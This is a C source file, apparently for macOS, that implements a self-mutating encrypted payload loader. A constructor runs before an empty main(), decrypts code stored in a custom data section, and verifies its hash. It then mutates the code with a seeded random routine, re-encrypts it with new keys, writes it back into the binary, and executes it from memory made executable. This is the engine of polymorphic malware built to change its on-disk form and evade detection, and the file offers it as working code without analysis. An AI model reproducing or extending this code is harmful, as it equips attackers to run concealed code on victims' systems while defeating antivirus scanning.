#include "wisp.h"

//===================================================================
//     INITIALIZATION & UPDATE
//===================================================================

__attribute__((always_inline))
static inline void initialize_payload(ENHEADER *hdr, uint8_t *payload) {
    uint8_t init[PS];
    memset(init, 0x90, PS);
    
#if defined(__x86_64__)
    if (te_len > SZ)
        exit(1);
    memcpy(init, ramp, te_len);
    {
        uintptr_t dex_addr = (uintptr_t)&dex;
        memcpy(init + 2, &dex_addr, sizeof(dex_addr));
    }
    {
        uintptr_t targets_addr = (uintptr_t)&tramp_;
        memcpy(init + 14, &targets_addr, sizeof(targets_addr));
    }
    if (te_len < SZ)
        memset(init + te_len, 0x90, SZ - te_len);
#elif defined(__arm64__)
    memcpy(init, ramp, te_len);
#endif

    if (getentropy(hdr->key, K) != 0 ||
        getentropy(hdr->iv, 16) != 0)
    {
        exit(1);
    }
    encrypt_payload(hdr->key, hdr->iv, init, payload, PS);
    CC_SHA256(payload, PS, hdr->hash);
    save((uint8_t *)hdr, sizeof(data));
    hdr->count = 1;
}

__attribute__((always_inline))
static inline void update_decrypted_code(uint8_t *dec) {
#if defined(__x86_64__)
    uintptr_t dex_addr = (uintptr_t)&dex;
    memcpy(dec + 2, &dex_addr, sizeof(dex_addr));
    uintptr_t targets_addr = (uintptr_t)&tramp_;
    memcpy(dec + 14, &targets_addr, sizeof(targets_addr));
#endif
}

//===================================================================
//         CONSTRUCTOR: ENTRY POINT (_entry) & MAIN
//===================================================================

__attribute__((constructor))
static void _entry(void) {
    whereyouat();
    unsigned long ds = 0;
    uint8_t *dsec = getsectiondata(&_mh_execute_header, "__DATA", "__fdata", &ds);
    if (!dsec || ds < sizeof(data))
        exit(1);

    ENHEADER *hdr = (ENHEADER *)dsec;
    uint8_t *payload = dsec + sizeof(ENHEADER);

    // First-time?
    if (hdr->count == 0) {
        initialize_payload(hdr, payload);
    }

    // Initialize our RNG state using the stored seed.
    ChaChaRNG rng;
    chacha20_init(&rng, (uint8_t *)&hdr->seed, sizeof(hdr->seed));

    // Decrypt
    uint8_t *dec = malloc(PS);
    if (!dec)
        return;
    decrypt_payload(hdr->key, hdr->iv, payload, dec, PS);

    // Verify
    uint8_t comp[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(payload, PS, comp);
    if (memcmp(hdr->hash, comp, CC_SHA256_DIGEST_LENGTH) != 0) {
        free(dec);
        exit(1);
    }

    update_decrypted_code(dec);

#if defined(__x86_64__)
    dex = weight(&rng);
#endif

    mutate_p(dec, PS, &rng);
    if (getentropy(hdr->key, K) != 0 ||
        getentropy(hdr->iv, 16) != 0)
    {
        zer(dec, PS);
        free(dec);
        return;
    }

    // Re-encrypt the mutated payload and update its hash.
    encrypt_payload(hdr->key, hdr->iv, dec, payload, PS);
    CC_SHA256(payload, PS, hdr->hash);
    save(dsec, sizeof(data));

    void *code_ptr = NULL;
    if (posix_memalign(&code_ptr, PS, PS) != 0) {
        free(dec);
        return;
    }
    if (mprotect(code_ptr, PS, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        free(code_ptr);
        free(dec);
        return;
    }
    _memcpy(code_ptr, dec, PS);
    if (mprotect(code_ptr, PS, PROT_READ | PROT_EXEC) != 0) {
        free(code_ptr);
        free(dec);
        return;
    }

    // Execute.
    execute(code_ptr, PS);
    free(code_ptr);
    zer(dec, PS);
    free(dec);

    // Update the execution count.
    hdr->seed = chacha20_random(&rng);
    hdr->count++;
}

int main(void) {
    return 0;
}
